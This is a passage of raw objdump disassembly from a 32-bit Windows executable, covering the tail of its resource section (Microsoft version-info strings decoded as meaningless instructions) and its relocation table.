  416319:	add    BYTE PTR [ebp+0x0],ch
  41631c:	jo     0x41631e
  41631e:	popa   
  41631f:	add    BYTE PTR [esi+0x0],ch
  416322:	jns    0x416324
  416324:	dec    esi
  416325:	add    BYTE PTR [ecx+0x0],ah
  416328:	ins    DWORD PTR es:[edi],dx
  416329:	add    BYTE PTR [ebp+0x0],ah
  41632c:	add    BYTE PTR [eax],al
  41632e:	add    BYTE PTR [eax],al
  416330:	dec    ebp
  416331:	add    BYTE PTR [ecx+0x0],ch
  416334:	arpl   WORD PTR [eax],ax
  416336:	jb     0x416338
  416338:	outs   dx,DWORD PTR ds:[esi]
  416339:	add    BYTE PTR [ebx+0x0],dh
  41633c:	outs   dx,DWORD PTR ds:[esi]
  41633d:	add    BYTE PTR [esi+0x0],ah
  416340:	je     0x416342
  416342:	and    BYTE PTR [eax],al
  416344:	inc    ebx
  416345:	add    BYTE PTR [edi+0x0],ch
  416348:	jb     0x41634a
  41634a:	jo     0x41634c
  41634c:	outs   dx,DWORD PTR ds:[esi]
  41634d:	add    BYTE PTR [edx+0x0],dh
  416350:	popa   
  416351:	add    BYTE PTR [eax+eax*1+0x69],dh
  416355:	add    BYTE PTR [edi+0x0],ch
  416358:	outs   dx,BYTE PTR ds:[esi]
  416359:	add    BYTE PTR [eax],al
  41635b:	add    BYTE PTR [eax+eax*1+0x12],cl
  41635f:	add    BYTE PTR [ecx],al
  416361:	add    BYTE PTR [esi+0x0],al
  416364:	imul   eax,DWORD PTR [eax],0x65006c
  41636a:	inc    esp
  41636b:	add    BYTE PTR [ebp+0x0],ah
  41636e:	jae    0x416370
  416370:	arpl   WORD PTR [eax],ax
  416372:	jb     0x416374
  416374:	imul   eax,DWORD PTR [eax],0x740070
  41637a:	imul   eax,DWORD PTR [eax],0x6e006f
  416380:	add    BYTE PTR [eax],al
  416382:	add    BYTE PTR [eax],al
  416384:	dec    eax
  416385:	add    BYTE PTR [ecx+0x0],ah
  416388:	jb     0x41638a
  41638a:	add    BYTE PTR fs:[edi+0x0],dh
  41638e:	popa   
  41638f:	add    BYTE PTR [edx+0x0],dh
  416392:	add    BYTE PTR gs:[eax],ah
  416395:	add    BYTE PTR [ebx+0x0],dl
  416398:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  41639d:	add    BYTE PTR [ecx+0x0],ch
  4163a0:	outs   dx,BYTE PTR ds:[esi]
  4163a1:	add    BYTE PTR [edi+0x0],ah
  4163a4:	jae    0x4163a6
  4163a6:	add    BYTE PTR [eax],al
  4163a8:	data16 add BYTE PTR [ebx],ah
  4163ab:	add    BYTE PTR [ecx],al
  4163ad:	add    BYTE PTR [esi+0x0],al
  4163b0:	imul   eax,DWORD PTR [eax],0x65006c
  4163b6:	push   esi
  4163b7:	add    BYTE PTR [ebp+0x0],ah
  4163ba:	jb     0x4163bc
  4163bc:	jae    0x4163be
  4163be:	imul   eax,DWORD PTR [eax],0x6e006f
  4163c4:	add    BYTE PTR [eax],al
  4163c6:	add    BYTE PTR [eax],al
  4163c8:	xor    DWORD PTR [eax],eax
  4163ca:	xor    BYTE PTR [eax],al
  4163cc:	add    BYTE PTR cs:[eax],dh
  4163cf:	add    BYTE PTR [esi],ch
  4163d1:	add    BYTE PTR [ecx],dh
  4163d3:	add    BYTE PTR [eax],dh
  4163d5:	add    BYTE PTR [edx],dh
  4163d7:	add    BYTE PTR [eax+eax*1],dh
  4163da:	xor    BYTE PTR [eax],al
  4163dc:	add    BYTE PTR cs:[ecx],dh
  4163df:	add    BYTE PTR [esi],dh
  4163e1:	add    BYTE PTR [ebx],dh
  4163e3:	add    BYTE PTR [eax],bh
  4163e5:	add    BYTE PTR [eax+eax*1],dh
  4163e8:	and    BYTE PTR [eax],al
  4163ea:	sub    BYTE PTR [eax],al
  4163ec:	je     0x4163ee
  4163ee:	push   0x2e003100
  4163f3:	add    BYTE PTR [ecx],dh
  4163f5:	add    BYTE PTR ds:0x37003000,dh
  4163fb:	add    BYTE PTR [eax],dh
  4163fd:	add    BYTE PTR [ecx],bh
  4163ff:	add    BYTE PTR ds:0x37003100,ch
  416405:	add    BYTE PTR [eax],dh
  416407:	add    BYTE PTR [eax],dh
  416409:	add    BYTE PTR [ecx],ch
  41640b:	add    BYTE PTR [eax],al
  41640d:	add    BYTE PTR [eax],al
  41640f:	add    BYTE PTR [edx+0x0],dl
  416412:	sbb    DWORD PTR [eax],eax
  416414:	add    DWORD PTR [eax],eax
  416416:	dec    ecx
  416417:	add    BYTE PTR [esi+0x0],ch
  41641a:	je     0x41641c
  41641c:	add    BYTE PTR gs:[edx+0x0],dh
  416420:	outs   dx,BYTE PTR ds:[esi]
  416421:	add    BYTE PTR [ecx+0x0],ah
  416424:	ins    BYTE PTR es:[edi],dx
  416425:	add    BYTE PTR [esi+0x0],cl
  416428:	popa   
  416429:	add    BYTE PTR [ebp+0x0],ch
  41642c:	add    BYTE PTR gs:[eax],al
  41642f:	add    BYTE PTR [ebx+0x0],dl
  416432:	jns    0x416434
  416434:	jae    0x416436
  416436:	je     0x416438
  416438:	add    BYTE PTR gs:[ebp+0x0],ch
  41643c:	push   eax
  41643d:	add    BYTE PTR [edx+0x0],dh
  416440:	outs   dx,DWORD PTR ds:[esi]
  416441:	add    BYTE PTR [eax+0x0],dh
  416444:	add    BYTE PTR gs:[edx+0x0],dh
  416448:	je     0x41644a
  41644a:	imul   eax,DWORD PTR [eax],0x730065
  416450:	dec    eax
  416451:	add    BYTE PTR [ecx+0x0],ah
  416454:	jb     0x416456
  416456:	add    BYTE PTR fs:[edi+0x0],dh
  41645a:	popa   
  41645b:	add    BYTE PTR [edx+0x0],dh
  41645e:	add    BYTE PTR gs:[eax],al
  416461:	add    BYTE PTR [eax],al
  416463:	add    BYTE PTR [eax+0x1002e00],al
  416469:	add    BYTE PTR [eax+eax*1+0x65],cl
  41646d:	add    BYTE PTR [edi+0x0],ah
  416470:	popa   
  416471:	add    BYTE PTR [eax+eax*1+0x43],ch
  416475:	add    BYTE PTR [edi+0x0],ch
  416478:	jo     0x41647a
  41647a:	jns    0x41647c
  41647c:	jb     0x41647e
  41647e:	imul   eax,DWORD PTR [eax],0x680067
  416484:	je     0x416486
  416486:	add    BYTE PTR [eax],al
  416488:	test   eax,0x4d002000
  41648d:	add    BYTE PTR [ecx+0x0],ch
  416490:	arpl   WORD PTR [eax],ax
  416492:	jb     0x416494
  416494:	outs   dx,DWORD PTR ds:[esi]
  416495:	add    BYTE PTR [ebx+0x0],dh
  416498:	outs   dx,DWORD PTR ds:[esi]
  416499:	add    BYTE PTR [esi+0x0],ah
  41649c:	je     0x41649e
  41649e:	and    BYTE PTR [eax],al
  4164a0:	inc    ebx
  4164a1:	add    BYTE PTR [edi+0x0],ch
  4164a4:	jb     0x4164a6
  4164a6:	jo     0x4164a8
  4164a8:	outs   dx,DWORD PTR ds:[esi]
  4164a9:	add    BYTE PTR [edx+0x0],dh
  4164ac:	popa   
  4164ad:	add    BYTE PTR [eax+eax*1+0x69],dh
  4164b1:	add    BYTE PTR [edi+0x0],ch
  4164b4:	outs   dx,BYTE PTR ds:[esi]
  4164b5:	add    BYTE PTR [esi],ch
  4164b7:	add    BYTE PTR [eax],ah
  4164b9:	add    BYTE PTR [ecx+0x0],al
  4164bc:	ins    BYTE PTR es:[edi],dx
  4164bd:	add    BYTE PTR [eax+eax*1+0x20],ch
  4164c1:	add    BYTE PTR [edx+0x0],dh
  4164c4:	imul   eax,DWORD PTR [eax],0x680067
  4164ca:	je     0x4164cc
  4164cc:	jae    0x4164ce
  4164ce:	and    BYTE PTR [eax],al
  4164d0:	jb     0x4164d2
  4164d2:	add    BYTE PTR gs:[ebx+0x0],dh
  4164d6:	add    BYTE PTR gs:[edx+0x0],dh
  4164da:	jbe    0x4164dc
  4164dc:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  4164e1:	add    BYTE PTR [eax],al
  4164e3:	add    BYTE PTR [edx+0x0],ah
  4164e6:	sbb    eax,0x4f000100
  4164eb:	add    BYTE PTR [edx+0x0],dh
  4164ee:	imul   eax,DWORD PTR [eax],0x690067
  4164f4:	outs   dx,BYTE PTR ds:[esi]
  4164f5:	add    BYTE PTR [ecx+0x0],ah
  4164f8:	ins    BYTE PTR es:[edi],dx
  4164f9:	add    BYTE PTR [esi+0x0],al
  4164fc:	imul   eax,DWORD PTR [eax],0x65006c
  416502:	outs   dx,BYTE PTR ds:[esi]
  416503:	add    BYTE PTR [ecx+0x0],ah
  416506:	ins    DWORD PTR es:[edi],dx
  416507:	add    BYTE PTR [ebp+0x0],ah
  41650a:	add    BYTE PTR [eax],al
  41650c:	push   ebx
  41650d:	add    BYTE PTR [ecx+0x0],bh
  416510:	jae    0x416512
  416512:	je     0x416514
  416514:	add    BYTE PTR gs:[ebp+0x0],ch
  416518:	push   eax
  416519:	add    BYTE PTR [edx+0x0],dh
  41651c:	outs   dx,DWORD PTR ds:[esi]
  41651d:	add    BYTE PTR [eax+0x0],dh
  416520:	add    BYTE PTR gs:[edx+0x0],dh
  416524:	je     0x416526
  416526:	imul   eax,DWORD PTR [eax],0x730065
  41652c:	dec    eax
  41652d:	add    BYTE PTR [ecx+0x0],ah
  416530:	jb     0x416532
  416532:	add    BYTE PTR fs:[edi+0x0],dh
  416536:	popa   
  416537:	add    BYTE PTR [edx+0x0],dh
  41653a:	add    BYTE PTR gs:[esi],ch
  41653d:	add    BYTE PTR [ebp+0x0],al
  416540:	pop    eax
  416541:	add    BYTE PTR [ebp+0x0],al
  416544:	add    BYTE PTR [eax],al
  416546:	add    BYTE PTR [eax],al
  416548:	push   0x0
  41654a:	and    eax,0x50000100
  41654f:	add    BYTE PTR [edx+0x0],dh
  416552:	outs   dx,DWORD PTR ds:[esi]
  416553:	add    BYTE PTR [eax+eax*1+0x75],ah
  416557:	add    BYTE PTR [ebx+0x0],ah
  41655a:	je     0x41655c
  41655c:	dec    esi
  41655d:	add    BYTE PTR [ecx+0x0],ah
  416560:	ins    DWORD PTR es:[edi],dx
  416561:	add    BYTE PTR [ebp+0x0],ah
  416564:	add    BYTE PTR [eax],al
  416566:	add    BYTE PTR [eax],al
  416568:	dec    ebp
  416569:	add    BYTE PTR [ecx+0x0],ch
  41656c:	arpl   WORD PTR [eax],ax
  41656e:	jb     0x416570
  416570:	outs   dx,DWORD PTR ds:[esi]
  416571:	add    BYTE PTR [ebx+0x0],dh
  416574:	outs   dx,DWORD PTR ds:[esi]
  416575:	add    BYTE PTR [esi+0x0],ah
  416578:	je     0x41657a
  41657a:	scas   al,BYTE PTR es:[edi]
  41657b:	add    BYTE PTR [eax],ah
  41657d:	add    BYTE PTR [edi+0x0],dl
  416580:	imul   eax,DWORD PTR [eax],0x64006e
  416586:	outs   dx,DWORD PTR ds:[esi]
  416587:	add    BYTE PTR [edi+0x0],dh
  41658a:	jae    0x41658c
  41658c:	scas   al,BYTE PTR es:[edi]
  41658d:	add    BYTE PTR [eax],ah
  41658f:	add    BYTE PTR [edi+0x0],cl
  416592:	jo     0x416594
  416594:	add    BYTE PTR gs:[edx+0x0],dh
  416598:	popa   
  416599:	add    BYTE PTR [eax+eax*1+0x69],dh
  41659d:	add    BYTE PTR [esi+0x0],ch
  4165a0:	add    BYTE PTR [bx+si],ah
  4165a3:	add    BYTE PTR [ebx+0x0],dl
  4165a6:	jns    0x4165a8
  4165a8:	jae    0x4165aa
  4165aa:	je     0x4165ac
  4165ac:	add    BYTE PTR gs:[ebp+0x0],ch
  4165b0:	add    BYTE PTR [eax],al
  4165b2:	add    BYTE PTR [eax],al
  4165b4:	inc    esi
  4165b5:	add    BYTE PTR [ecx],dl
  4165b7:	add    BYTE PTR [ecx],al
  4165b9:	add    BYTE PTR [eax+0x0],dl
  4165bc:	jb     0x4165be
  4165be:	outs   dx,DWORD PTR ds:[esi]
  4165bf:	add    BYTE PTR [eax+eax*1+0x75],ah
  4165c3:	add    BYTE PTR [ebx+0x0],ah
  4165c6:	je     0x4165c8
  4165c8:	push   esi
  4165c9:	add    BYTE PTR [ebp+0x0],ah
  4165cc:	jb     0x4165ce
  4165ce:	jae    0x4165d0
  4165d0:	imul   eax,DWORD PTR [eax],0x6e006f
  4165d6:	add    BYTE PTR [eax],al
  4165d8:	xor    DWORD PTR [eax],eax
  4165da:	xor    BYTE PTR [eax],al
  4165dc:	add    BYTE PTR cs:[eax],dh
  4165df:	add    BYTE PTR [esi],ch
  4165e1:	add    BYTE PTR [ecx],dh
  4165e3:	add    BYTE PTR [eax],dh
  4165e5:	add    BYTE PTR [edx],dh
  4165e7:	add    BYTE PTR [eax+eax*1],dh
  4165ea:	xor    BYTE PTR [eax],al
  4165ec:	add    BYTE PTR cs:[ecx],dh
  4165ef:	add    BYTE PTR [esi],dh
  4165f1:	add    BYTE PTR [ebx],dh
  4165f3:	add    BYTE PTR [eax],bh
  4165f5:	add    BYTE PTR [eax+eax*1],dh
  4165f8:	add    BYTE PTR [eax],al
  4165fa:	add    BYTE PTR [eax],al
  4165fc:	inc    esp
  4165fd:	add    BYTE PTR [eax],al
  4165ff:	add    BYTE PTR [ecx],al
  416601:	add    BYTE PTR [esi+0x0],dl
  416604:	popa   
  416605:	add    BYTE PTR [edx+0x0],dh
  416608:	inc    esi
  416609:	add    BYTE PTR [ecx+0x0],ch
  41660c:	ins    BYTE PTR es:[edi],dx
  41660d:	add    BYTE PTR [ebp+0x0],ah
  416610:	dec    ecx
  416611:	add    BYTE PTR [esi+0x0],ch
  416614:	data16 add BYTE PTR [edi+0x0],ch
  416618:	add    BYTE PTR [eax],al
  41661a:	add    BYTE PTR [eax],al
  41661c:	and    al,0x0
  41661e:	add    al,0x0
  416620:	add    BYTE PTR [eax],al
  416622:	push   esp
  416623:	add    BYTE PTR [edx+0x0],dh
  416626:	popa   
  416627:	add    BYTE PTR [esi+0x0],ch
  41662a:	jae    0x41662c
  41662c:	ins    BYTE PTR es:[edi],dx
  41662d:	add    BYTE PTR [ecx+0x0],ah
  416630:	je     0x416632
  416632:	imul   eax,DWORD PTR [eax],0x6e006f
  416638:	add    BYTE PTR [eax],al
  41663a:	add    BYTE PTR [eax],al
  41663c:	or     DWORD PTR [eax+esi*4],eax
  41663f:	add    al,0xcd
  416641:	dec    ch
  416643:	(bad)  
  416644:	rol    BYTE PTR [eax],1
  416646:	add    BYTE PTR [eax],al
  416648:	add    BYTE PTR [eax],al
  41664a:	add    DWORD PTR [eax],eax
  41664c:	add    BYTE PTR [eax],al
  41664e:	add    BYTE PTR [eax],al
  416650:	adc    DWORD PTR [eax],eax
  416652:	add    BYTE PTR [eax],al
  416654:	add    BYTE PTR [eax],al
  416656:	add    BYTE PTR [eax],al
  416658:	add    al,BYTE PTR [eax]
  41665a:	add    BYTE PTR [eax],al
  41665c:	and    DWORD PTR [esi+ebx*8],edx
  41665f:	and    BYTE PTR [eax+0x311a8495],al
  416665:	sbb    al,BYTE PTR [ebx-0x3a]
  416668:	mov    ds:0xea5242dd,eax
  41666d:	in     eax,0xd3
  41666f:	test   DWORD PTR [eax],0x49f2e99
  416675:	loop   0x416673
  416677:	xchg   edi,eax
  416678:	add    eax,0x508b25
	...
  416691:	add    BYTE PTR [eax],al
  416693:	add    BYTE PTR [eax+0xe000000],cl
  416699:	add    BYTE PTR [eax],al
  41669b:	add    BYTE PTR [eax+0x10000000],bl
  4166a1:	add    BYTE PTR [eax],al
  4166a3:	add    BYTE PTR [eax+0xe000000],ch
  4166a9:	add    BYTE PTR [eax],al
  4166ab:	add    BYTE PTR [eax+0x8000000],bh
	...
  4166b9:	add    BYTE PTR [eax],al
  4166bb:	add    al,al
  4166bd:	add    BYTE PTR [eax],al
  4166bf:	add    BYTE PTR [eax+eax*1],cl
  4166c2:	add    BYTE PTR [eax],al
  4166c4:	add    BYTE PTR [eax],al
  4166c6:	add    BYTE PTR [eax],al
  4166c8:	dec    ebp
  4166c9:	add    BYTE PTR [ebp+0x0],dl
  4166cc:	dec    ecx
	...
  4166d5:	add    BYTE PTR [eax],al
  4166d7:	add    BYTE PTR [ebx],al
  4166d9:	add    BYTE PTR [eax],al
  4166db:	add    BYTE PTR [esi],cl
  4166dd:	add    BYTE PTR [eax],al
  4166df:	add    BYTE PTR [eax],dl
  4166e1:	add    BYTE PTR [eax],al
  4166e3:	add    BYTE PTR [eax],bl
  4166e5:	add    BYTE PTR [eax],al
  4166e7:	add    BYTE PTR [ebp+0x0],cl
  4166ea:	push   ebp
  4166eb:	add    BYTE PTR [ecx+0x0],cl
	...
  4166f6:	add    BYTE PTR [eax],al
  4166f8:	push   es
  4166f9:	add    BYTE PTR [eax],al
  4166fb:	add    BYTE PTR [eax],dl
  4166fd:	add    BYTE PTR [eax],al
  4166ff:	add    BYTE PTR [ebp+0x0],ah
  416702:	outs   dx,BYTE PTR ds:[esi]
  416703:	add    BYTE PTR ds:0x53005500,ch
  416709:	add    BYTE PTR [eax],al
  41670b:	add    BYTE PTR [eax],al
  41670d:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00417000 <.reloc>:
  417000:	add    BYTE PTR [eax],dl
  417002:	add    BYTE PTR [eax],al
  417004:	sub    al,0x1
  417006:	add    BYTE PTR [eax],al
  417008:	add    al,0x30
  41700a:	adc    BYTE PTR [eax],dh
  41700c:	adc    al,0x30
  41700e:	inc    eax
  41700f:	xor    BYTE PTR [eax+esi*1+0x4],al
  417013:	xor    DWORD PTR [eax],ecx
  417015:	xor    DWORD PTR [eax],edx
  417017:	xor    DWORD PTR [eax],ebx
  417019:	xor    DWORD PTR [esi+0x33],edx
  41701c:	pop    esp
  41701d:	xor    edi,DWORD PTR [eax+0x33]
  417020:	test   BYTE PTR [ebx],dh
  417022:	mov    dh,BYTE PTR [ebx]
  417024:	xchg   edi,eax
  417025:	xor    ebp,DWORD PTR [ebp-0x3fcc49cd]
  41702b:	xor    ecx,ecx
  41702d:	xor    edx,ebx
  41702f:	xor    ebx,edi
  417031:	xor    esp,ebp
  417033:	xor    ebp,esp
  417035:	xor    esi,ebp
  417037:	xor    edi,ebx
  417039:	xor    eax,DWORD PTR [ebx]
  41703b:	xor    al,0x9
  41703d:	xor    al,0x16
  41703f:	xor    al,0x1e
  417041:	xor    al,0x24
  417043:	xor    al,0x41
  417045:	xor    al,0x46
  417047:	xor    al,0x4c
  417049:	xor    al,0x51
  41704b:	xor    al,0x56
  41704d:	xor    al,0x5b
  41704f:	xor    al,0x60
  417051:	xor    al,0x66
  417053:	xor    al,0x6e
  417055:	xor    al,0x7b
  417057:	xor    al,0x92
  417059:	xor    al,0xaf
  41705b:	xor    al,0xc7
  41705d:	xor    al,0xde
  41705f:	xor    al,0xe6
  417061:	xor    al,0xef
  417063:	xor    al,0xf4
  417065:	xor    al,0xf9
  417067:	xor    al,0xf
  417069:	xor    eax,0x351c3515
  41706e:	and    DWORD PTR ds:0x353d352e,esi
  417074:	inc    ebp
  417075:	xor    eax,0x3563354d
  41707a:	imul   esi,DWORD PTR ds:0x35c33572,0xffffffcd
  417081:	xor    eax,0x35dd35d3
  417086:	adc    eax,0x25361b36
  41708b:	sub    esi,DWORD PTR ss:[esi]
  41708e:	xor    al,0x36
  417090:	cmp    DWORD PTR [esi],esi
  417092:	imul   esi,DWORD PTR [esi],0xffffff8e
  417095:	shl    BYTE PTR ss:[esi],cl
  417098:	sub    DWORD PTR [edi],esi
  41709a:	inc    ecx
  41709b:	aaa    
  41709c:	inc    edi
  41709d:	aaa    
  41709e:	push   esi
  41709f:	aaa    
  4170a0:	bound  esi,QWORD PTR [edi]
  4170a2:	xlat   BYTE PTR ds:[ebx]
  4170a3:	aaa    
  4170a4:	or     al,0x38
  4170a6:	mov    BYTE PTR [eax],bh
  4170a8:	lea    edi,[eax]
  4170aa:	lahf   
  4170ab:	cmp    BYTE PTR [ebp-0x28c72ec8],bh
  4170b1:	cmp    BYTE PTR [ecx-0x3fc64bc7],bl
  4170b7:	cmp    edi,ecx
  4170b9:	cmp    eax,ebx
  4170bb:	cmp    ecx,esp
  4170bd:	cmp    esi,esi
  4170bf:	cmp    DWORD PTR [ebx],ecx
  4170c1:	cmp    bl,BYTE PTR [eax]
  4170c3:	cmp    ah,BYTE PTR [eax]
  4170c5:	cmp    bh,BYTE PTR [ebx]
  4170c7:	cmp    cl,BYTE PTR [edx+0x3a]
  4170ca:	push   ebp
  4170cb:	cmp    dh,BYTE PTR [edx+0x3a]
  4170ce:	ret    0xc73a
  4170d1:	cmp    ch,bh
  4170d3:	cmp    bh,al
  4170d5:	cmp    al,BYTE PTR [ebx]
  4170d7:	cmp    ecx,DWORD PTR [edx]
  4170d9:	cmp    esp,DWORD PTR [ecx]
  4170db:	cmp    esp,DWORD PTR [edi]
  4170dd:	cmp    ebp,DWORD PTR ds:0x393b333b
  4170e3:	cmp    edi,DWORD PTR [edi]
  4170e5:	cmp    eax,DWORD PTR [esi+0x3b]
  4170e8:	dec    ebp
  4170e9:	cmp    edx,DWORD PTR [ebx+edi*1+0x5b]
  4170ed:	cmp    esp,DWORD PTR [edx+0x3b]
  4170f0:	imul   edi,DWORD PTR [ebx],0x3b783b70
  4170f6:	cmp    BYTE PTR [ebx],0x88
  4170f9:	cmp    edx,DWORD PTR [ebx+edi*1+0x3ba23b9d]
  417100:	test   al,0x3b
  417102:	mov    dl,0x3b
  417104:	mov    esp,0xdc3bcc3b
  417109:	cmp    esp,edx
  41710b:	cmp    ebp,ebp
  41710d:	cmp    esi,ebx
  41710f:	cmp    edi,edi
  417111:	cmp    ecx,DWORD PTR [edi]
  417113:	cmp    al,0x18
  417115:	cmp    al,0x2d
  417117:	cmp    al,0x4a
  417119:	cmp    al,0x8c
  41711b:	cmp    al,0xa4
  41711d:	cmp    al,0xa8
  41711f:	cmp    al,0xb0
  417121:	cmp    al,0xb4
  417123:	cmp    al,0xcc
  417125:	cmp    al,0xd0
  417127:	cmp    al,0xec
  417129:	cmp    al,0xf0
  41712b:	cmp    al,0x0
  41712d:	xor    BYTE PTR [eax],al
  41712f:	add    BYTE PTR [eax+eax*1],cl
  417132:	add    BYTE PTR [eax],al
  417134:	nop
  417135:	xor    BYTE PTR [eax],al
	...
